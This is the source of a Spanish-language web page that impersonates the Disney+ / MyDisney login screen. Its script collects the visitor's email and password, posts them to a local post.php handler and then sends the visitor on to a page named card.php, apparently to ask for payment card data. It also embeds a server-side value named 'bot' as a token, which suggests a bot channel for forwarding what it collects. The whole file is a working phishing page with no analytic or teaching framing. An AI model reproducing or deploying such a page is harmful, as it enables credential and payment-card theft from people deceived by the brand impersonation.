<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <link rel="stylesheet" href="res/login.css">
</head>
<body>
<header>
    <img src="res/logo.png">
</header>    

<main>
<script>var token=<?php echo json_encode($bot); ?>;</script>


<div class="form">

<div class="col logo">
    <img src="res/logo-black.png">
</div>

<div id="user">
<div class="col title">
Ingresa tu correo electrónico para continuar
</div>
<div class="col text">
Conéctate a Disney+ con tu cuenta MyDisney. Si no tienes una, se te pedirá que crees una.
</div>
<div class="col">
    <input type="text" id="u" autofocus placeholder="Correo electrónico">
</div>
<div class="col btn">
    <button onclick="sendUser()">Continuar</button>
</div>
</div>

<div id="pass" style="display:none;">
<div class="col title">
Ingresa tu contraseña
</div>
<div class="col text">
Conéctate a Disney+ con tu cuenta MyDisney.
</div>
<div class="col">
    <input type="password" id="p" placeholder="Contraseña">
</div>
<div class="col btn">
    <button onclick="sendPass()">Iniciar sesión</button>
</div>
</div>

<div class="col info">
<b>Disney+ es parte de la familia de empresas de The Walt Disney Company</b>
<span>MyDisney te permite conectarte fácilmente a los servicios y experiencias ofrecidos por la familia de empresas de The Walt Disney Company, como Disney+, ESPN, Walt Disney World, <a href="#">y más</a>.</span>
<img src="res/pubs.png">
</div>

</div>

</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

function sendUser(){
    if($("#u").val().length < 5){
        return $("#u").addClass("error");
    }
    $("#user").hide();
    $("#pass").show();
    $("#p").focus();
}

function sendPass(){
    if($("#p").val().length < 5){
        return $("#p").addClass("error");
    }
    $.post("post.php",{user:$("#u").val(), pass:$("#p").val()},(res)=>{
        window.location="card.php";
    })
}

$("#u").keypress((e)=>{
    if(e.key=="Enter"){
        sendUser();
    }
});

$("#p").keypress((e)=>{
    if(e.key=="Enter"){
        sendPass();
    }
});
</script>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
</body>
</html>